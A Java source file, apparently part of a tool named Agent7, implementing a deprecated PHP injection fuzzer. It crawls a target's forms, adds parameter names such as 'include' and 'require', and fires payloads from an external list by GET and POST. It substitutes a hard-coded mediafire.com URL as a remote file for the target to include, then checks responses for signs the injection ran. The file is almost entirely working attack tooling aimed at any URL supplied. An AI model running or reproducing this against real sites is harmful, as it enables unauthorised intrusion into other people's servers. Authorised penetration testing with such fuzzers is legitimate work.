package me.dylan.Agent7.http.Fuzzer;

import java.io.IOException;
import java.net.Inet4Address;
import java.net.URISyntaxException;
import java.net.UnknownHostException;
import java.util.ArrayList;

import me.dylan.Agent7.Agent7;
import me.dylan.Agent7.res.ContentLoader;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.Connection.Method;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

/**
 * Deprecated, as PHP has implemented a fix for most PHP injection attacks
 * in the latest version.
 * 
 * @author Dylan
 * 
 */
@Deprecated
public class FuzzerPhp extends Fuzzer {

	public FuzzerPhp(String url) {
		if (!url.startsWith("htt"))
			url = "http://" + url;
		this.url = url;
		try {
			payloads = PayloadUtil.getInjectionPayloads("PHPTests.txt");
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		this.sendInitialRequest();
		this.gatherAllFormIds();
		this.beginInjection();
	}

	public void beginInjectionLinks() {
		getCommonLinkExtensions();
		connectionMethod = "GET";
		Agent7.logLine("Testing popular url extensions(GET).");
		executeTestConnection(params);

		connectionMethod = "POST";
		Agent7.logLine("Testing popular url extensions(POST).");
		executeTestConnection(params);
		params.clear();
		/*
		 * Elements linkElements = doc.getElementsByTag("a"); for (Element
		 * inputEl : linkElements) { if (!inputEl.text().contains(url))
		 * continue; url = inputEl.attr("abs:href"); connectionMethod = "GET";
		 * params.add(inputEl.text()); }
		 */
		executeTestConnection(params);
	}

	public void beginInjectionForms() {

		for (Element e : forms) {
			url = e.attr("abs:action");
			connectionMethod = e.attr("method");
			if (url.isEmpty())
				continue;
			if (connectionMethod.isEmpty())
				connectionMethod = "GET";
			Elements inputElements = e.getElementsByTag("input");
			for (Element inputEl : inputElements) {
				if (inputEl.attr("type").toLowerCase() == "submit")
					continue;
				params.add(inputEl.attr("name"));
			}
			executeTestConnection(params);
		}
	}

	public void getCommonLinkExtensions() {
		params.add("url");
		params.add("page");
		params.add("pg");
		params.add("pgid");
		params.add("value");
		params.add("val");
		params.add("include");
		params.add("inc");
		params.add("location");
		params.add("loc");
		params.add("require");
	}

	@Override
	public void beginInjection() {
		Agent7.logLine("Beginning injection process.");
		Agent7.logLine("Testing forms...");
		beginInjectionForms();
		Agent7.logLine("Testing extras...");
		beginInjectionLinks();
	}

	@Override
	public void executeTestConnection(ArrayList<String> params) {
		int queriesAttempted = 0;
		for (String name : params) {
			for (String payload : payloads) {
				int index = payloads.indexOf(payload);
				queriesAttempted++;
				double progress = ((double) (queriesAttempted) / (double) ((payloads
						.size() * params.size()))) * 100;
				Agent7.setProgress((int) Math.ceil(progress));

				try {
					payload = payload.replace("#ip", Inet4Address.getLocalHost()
							.getHostAddress());
				} catch (UnknownHostException e1) {
					e1.printStackTrace();
				}
				payload = payload.replace("#payload", "vulnerablePage" + index
						+ "#" + name);
				payload = payload.replace("#testfile",
						"http://www.mediafire.com/?3akbzhyfo9827nr");
				try {
					Connection connection = Jsoup.connect(url);
					sendGetPostPayloads(connection, payload);
					verifyPayloadExecution(index, name);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		// Agent7.logLine(doc.html());
	}

	public void verifyPayloadExecution(int index, String name)
			throws UnknownHostException {
		Element e = doc.getElementById("vulnerablePage" + index + "#" + name);
		if (e != null
				&& !e.parents().html().contains("noscript")
				&& e.data().contains(
						Inet4Address.getLocalHost().getHostAddress()))
			Agent7.logLine("Found vunerability using payload: "
					+ payloads.get(index) + " On form: " + name);
	}

	public void sendGetPostPayloads(Connection connection, String payload) {
		for (String param : params) {
			if (param.isEmpty())
				continue;
			connection.data(param, payload);
		}
		try {
			if (connectionMethod.equalsIgnoreCase("post")) {
				Connection.Response response = connection.method(Method.POST)
						.execute();
				doc = response.parse();
			} else {
				Connection.Response response = connection.method(Method.GET)
						.execute();
				doc = response.parse();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

}
